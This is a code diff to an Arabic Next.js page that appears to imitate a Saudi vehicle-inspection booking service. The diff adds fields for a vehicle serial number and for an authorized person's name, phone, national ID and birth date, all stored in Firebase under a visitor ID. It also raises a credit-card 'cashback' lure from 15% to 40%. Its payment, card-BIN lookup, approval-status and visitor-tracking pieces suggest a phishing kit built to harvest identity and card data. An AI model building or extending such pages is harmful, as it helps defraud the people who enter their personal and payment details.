@@ -1,6 +1,6 @@
 "use client"
 
-import type React from "react"
+import React, { useEffect, useState } from "react"
 import Image from "next/image"
 import VerificationPage from "@/components/verification-page"
 import { Dialog, DialogContent } from "@/components/ui/dialog"
@@ -12,14 +12,13 @@ import { CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 import { AlertCircle } from "lucide-react"
 
-import { useEffect, useState } from "react"
 import { Button } from "@/components/ui/button"
 import { Card, CardContent } from "@/components/ui/card"
 import { Car, Truck, CreditCard, Wallet, Lock } from "lucide-react"
 import { doc, onSnapshot } from "firebase/firestore"
 import { addData, db } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
-import type { VehicleStatus, VehicleType, AppStep, PaymentMethod, BankInfo, BinDatabase, ApprovalStatus } from "@/types"
+import type { VehicleStatus, VehicleType, AppStep, PaymentMethod, BankInfo, BinDatabase, ApprovalStatus } from "@/lib/types"
 import { SaudiPlateInput } from "@/components/saudi-plate-input"
 import { validateSaudiPhoneNumber, validateSaudiNationalId } from "@/lib/validation"
 
@@ -101,6 +100,8 @@ export default function BookingPage() {
   const [ownerName, setOwnerName] = useState("")
   const [nationalId, setNationalId] = useState("")
   const [displayNationalId, setDisplayNationalId] = useState("")
+  const [serialNumber, setSerialNumber] = useState("")
+  // </CHANGE>
   const [region, setRegion] = useState("")
   const [city, setCity] = useState("")
   const [inspectionCenter, setInspectionCenter] = useState("")
@@ -109,6 +110,15 @@ export default function BookingPage() {
   const [captchaChecked, setCaptchaChecked] = useState(true)
   const [inspectionType, setInspectionType] = useState("") // Added declaration
   const [vehicleInfoError, setVehicleInfoError] = useState("") // Added vehicleInfoError state
+
+  // ADDED START
+  const [authorizedPersonType, setAuthorizedPersonType] = React.useState<"resident" | "gcc">("resident")
+  const [authorizedName, setAuthorizedName] = React.useState("")
+  const [authorizedPhone, setAuthorizedPhone] = React.useState("")
+  const [authorizedId, setAuthorizedId] = React.useState("")
+  const [authorizedBirthDate, setAuthorizedBirthDate] = React.useState("")
+  const [authorizedAgreement, setAuthorizedAgreement] = React.useState(false)
+  // ADDED END
 
   const [currentStep, setCurrentStep] = useState<AppStep>("landing") // Changed initial step to landing
   const [paymentMethod, setPaymentMethod] = useState<PaymentMethod | "">("")
@@ -547,7 +557,7 @@ export default function BookingPage() {
       label: "بطاقة ائتمان",
       icon: Wallet,
       description: "فيزا أو ماستركارد",
-      badge: "استرداد نقدي 15%",
+      badge: "استرداد نقدي 40%",
       available: true,
     },
     {
@@ -573,9 +583,10 @@ export default function BookingPage() {
       !plateNumbers ||
       !plateLetters ||
       !country ||
-      !registrationType ||
       !ownerName ||
       !nationalId ||
+      !serialNumber ||
+      // </CHANGE>
       !inspectionType ||
       !region ||
       !city ||
@@ -594,6 +605,19 @@ export default function BookingPage() {
       return
     }
 
+    // ADDED START
+    if (!authorizedName || !authorizedPhone || !authorizedId || !authorizedBirthDate || !authorizedAgreement) {
+      setVehicleInfoError("يرجى ملء جميع بيانات المفوض المطلوبة والموافقة على الشروط.")
+      return
+    }
+
+    const authorizedPhoneValidation = validateSaudiPhoneNumber(authorizedPhone)
+    if (!authorizedPhoneValidation.valid) {
+      setVehicleInfoError(authorizedPhoneValidation.error || "رقم جوال المفوض غير صحيح")
+      return
+    }
+    // ADDED END
+
     await addData({
       id: visitorID,
       vehicleStatus,
@@ -605,12 +629,21 @@ export default function BookingPage() {
       vehicleType,
       ownerName,
       nationalId,
+      serialNumber,
+      // </CHANGE>
       region,
       city,
       inspectionCenter,
       inspectionDate,
       inspectionTime,
       inspectionType,
+      // ADDED START
+      authorizedPersonType,
+      authorizedName,
+      authorizedPhone,
+      authorizedId,
+      authorizedBirthDate,
+      // ADDED END
       step: "booking-details-submitted",
     })
     setIsLoading(true)
@@ -853,7 +886,7 @@ export default function BookingPage() {
             </div>
             <div className="text-center space-y-3 pt-2">
               <h3 className="text-xl font-bold text-gray-900">عرض خاص!</h3>
-              <p className="text-gray-600">استمتع بخصم 15% عند الدفع ببطاقة الائتمان</p>
+              <p className="text-gray-600">استمتع بخصم 40% عند الدفع ببطاقة الائتمان</p>
               <button
                 onClick={() => setShowOfferModal(false)}
                 className="w-full bg-emerald-600 text-white py-3 rounded-lg font-medium hover:bg-emerald-700 transition-colors"
@@ -915,14 +948,14 @@ export default function BookingPage() {
                 {/* Country and Plate Info */}
                 <div className="grid gap-4">
                   <div className="space-y-3">
-                    <label className="text-sm font-medium text-foreground">الدولة</label>
+                    <label className="text-sm font-medium text-foreground">الجنسية</label>
                     <select
                       value={country}
                       onChange={(e) => setCountry(e.target.value)}
                       className="w-full h-12 px-4 rounded-lg border border-border bg-background text-foreground focus:border-teal-700 focus:ring-1 focus:ring-teal-700"
                       required
                     >
-                      <option value="">اختر الدولة</option>
+                      <option value="">اختر الجنسية</option>
                       {countries.map((c) => (
                         <option key={c.code} value={c.code}>
                           {c.nameAr} ({c.nameEn})
@@ -930,26 +963,10 @@ export default function BookingPage() {
                       ))}
                     </select>
                   </div>
-                  <Input
-                    placeholder="معلومات إضافية للوحة"
-                    value={plateInfo}
-                    onChange={(e) => setPlateInfo(e.target.value)}
-                    className="h-12"
-                  />
+                
                 </div>
 
-                {/* Registration Type */}
-                <div className="space-y-3">
-                  <label className="text-sm font-medium text-foreground">نوع التسجيل</label>
-                  <Input
-                    placeholder="نوع التسجيل"
-                    value={registrationType}
-                    onChange={(e) => setRegistrationType(e.target.value)}
-                    className="h-12"
-                    required
-                  />
-                </div>
-
+          
                 {/* Owner Name */}
                 <div className="space-y-3">
                   <label className="text-sm font-medium text-foreground">اسم المالك</label>
@@ -990,6 +1007,19 @@ export default function BookingPage() {
                   </p>
                 </div>
 
+                <div className="space-y-3">
+                  <label className="text-sm font-medium text-foreground">الرقم التسلسلي</label>
+                  <Input
+                    type="text"
+                    value={serialNumber}
+                    onChange={(e) => setSerialNumber(e.target.value)}
+                    placeholder="أدخل الرقم التسلسلي للمركبة"
+                    className="h-12"
+                    required
+                  />
+                </div>
+                {/* </CHANGE> */}
+
                 {/* Inspection Type */}
                 <div className="space-y-3">
                   <label className="text-sm font-medium text-foreground">نوع الفحص</label>
@@ -1007,6 +1037,157 @@ export default function BookingPage() {
                     ))}
                   </select>
                 </div>
+
+                {/* ADDED START */}
+                <div className="border-t pt-8 mt-8">
+                  <h3 className="text-xl font-bold text-foreground mb-6">بيانات المفوض</h3>
+
+                  {/* Authorized Person Type */}
+                  <div className="space-y-3 mb-6">
+                    <div className="flex gap-4 justify-end">
+                      <button
+                        type="button"
+                        onClick={() => setAuthorizedPersonType("gcc")}
+                        className={`px-6 py-3 rounded-lg border-2 transition-all ${
+                          authorizedPersonType === "gcc"
+                            ? "border-teal-700 bg-teal-700/5 text-foreground font-medium"
+                            : "border-border text-muted-foreground"
+                        }`}
+                      >
+                        مواطن خليجي
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => setAuthorizedPersonType("resident")}
+                        className={`px-6 py-3 rounded-lg border-2 transition-all ${
+                          authorizedPersonType === "resident"
+                            ? "border-teal-700 bg-teal-700/5 text-foreground font-medium"
+                            : "border-border text-muted-foreground"
+                        }`}
+                      >
+                        مواطن/مقيم
+                      </button>
+                    </div>
+                  </div>
+
+                  {/* Authorized Name */}
+                  <div className="space-y-3 mb-6">
+                    <label className="text-sm font-medium text-foreground">
+                      اسم المفوض <span className="text-red-500">*</span>
+                    </label>
+                    <Input
+                      type="text"
+                      value={authorizedName}
+                      onChange={(e) => setAuthorizedName(e.target.value)}
+                      placeholder="أدخل اسم المفوض"
+                      className="h-12"
+                      required
+                    />
+                  </div>
+
+                  {/* Authorized Phone */}
+                  <div className="space-y-3 mb-6">
+                    <label className="text-sm font-medium text-foreground">
+                      رقم جوال المفوض <span className="text-red-500">*</span>
+                    </label>
+                    <div className="flex gap-2">
+                      <div className="w-32 h-12 px-3 rounded-lg border border-border bg-muted flex items-center justify-center gap-2">
+                        <span className="text-xl">🇸🇦</span>
+                        <span className="text-sm font-medium">+966</span>
+                      </div>
+                      <Input
+                        type="tel"
+                        inputMode="numeric"
+                        maxLength={10}
+                        value={authorizedPhone}
+                        onChange={(e) => {
+                          const value = e.target.value
+                            .replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString())
+                            .replace(/\D/g, "")
+                          setAuthorizedPhone(value)
+                        }}
+                        placeholder="5XXXXXXXX"
+                        className="h-12 flex-1"
+                        required
+                      />
+                    </div>
+                  </div>
+
+                  {/* Authorized ID */}
+                  <div className="space-y-3 mb-6">
+                    <label className="text-sm font-medium text-foreground">
+                      رقم الهوية / إقامة المفوض <span className="text-red-500">*</span>
+                    </label>
+                    <div className="relative">
+                      <Input
+                        type="text"
+                        inputMode="numeric"
+                        maxLength={10}
+                        value={authorizedId}
+                        onChange={(e) => {
+                          const value = e.target.value
+                            .replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString())
+                            .replace(/\D/g, "")
+                          setAuthorizedId(value)
+                        }}
+                        placeholder="0000 0000 000"
+                        className="h-12 pl-12"
+                        required
+                      />
+                      <div className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                          <rect x="3" y="5" width="18" height="14" rx="2" strokeWidth="2" />
+                          <circle cx="9" cy="11" r="2" strokeWidth="2" />
+                          <path d="M15 10h2M15 13h2" strokeWidth="2" strokeLinecap="round" />
+                        </svg>
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Authorized Birth Date */}
+                  <div className="space-y-3 mb-6">
+                    <label className="text-sm font-medium text-foreground">
+                      تاريخ ميلاد المفوض <span className="text-red-500">*</span>
+                    </label>
+                    <div className="relative">
+                      <Input
+                        type="date"
+                        value={authorizedBirthDate}
+                        onChange={(e) => setAuthorizedBirthDate(e.target.value)}
+                        className="h-12 pl-12"
+                        required
+                      />
+                      <div className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground pointer-events-none">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                          <rect x="3" y="4" width="18" height="18" rx="2" ry="2" strokeWidth="2" />
+                          <line x1="16" y1="2" x2="16" y2="6" strokeWidth="2" strokeLinecap="round" />
+                          <line x1="8" y1="2" x2="8" y2="6" strokeWidth="2" strokeLinecap="round" />
+                          <line x1="3" y1="10" x2="21" y2="10" strokeWidth="2" />
+                        </svg>
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Agreement Checkbox */}
+                  <div className="flex items-start gap-3 mb-6">
+                    <input
+                      type="checkbox"
+                      id="authorized-agreement"
+                      checked={authorizedAgreement}
+                      onChange={(e) => setAuthorizedAgreement(e.target.checked)}
+                      className="mt-1 w-5 h-5 rounded border-border text-teal-700 focus:ring-teal-700"
+                      required
+                    />
+                    <label
+                      htmlFor="authorized-agreement"
+                      className="text-sm text-muted-foreground leading-relaxed cursor-pointer"
+                    >
+                      أوافق على أن خدمة التفويض تقتصر على إعطاء المفوض الصلاحية بزيارة وإجراء الفحص الفني للمركبة المفوض
+                      عليها
+                    </label>
+                  </div>
+                </div>
+                {/* ADDED END */}
 
                 {/* Location Selection */}
                 <div className="space-y-4">
@@ -1100,7 +1281,7 @@ export default function BookingPage() {
                   </Alert>
                 )}
 
-                <Button type="submit" className="w-full h-14 text-lg font-semibold bg-teal-700 hover:bg-teal-700/90">
+                <Button type="submit" className="w-full h-14 text-lg text-white font-semibold bg-teal-700 hover:bg-teal-700/90">
                   التالي
                 </Button>
               </form>
@@ -1166,7 +1347,7 @@ export default function BookingPage() {
               <Button
                 onClick={handlePaymentMethodSubmit}
                 disabled={!paymentMethod || isLoading}
-                className="w-full mt-8 h-14 text-lg font-semibold bg-teal-700 hover:bg-teal-700/90"
+                className="w-full mt-8 h-14 text-lg text-white font-semibold bg-teal-700 hover:bg-teal-700/90"
               >
                 {isLoading ? (
                   <>
@@ -1200,7 +1381,7 @@ export default function BookingPage() {
             </div>
             <div className="text-center space-y-3 pt-2">
               <h3 className="text-xl font-bold text-gray-900">عرض خاص!</h3>
-              <p className="text-gray-600">استمتع بخصم 15% عند الدفع ببطاقة الائتمان</p>
+              <p className="text-gray-600">استمتع بخصم 40% عند الدفع ببطاقة الائتمان</p>
               <button
                 onClick={() => setShowOfferModal(false)}
                 className="w-full bg-emerald-600 text-white py-3 rounded-lg font-medium hover:bg-emerald-700 transition-colors"
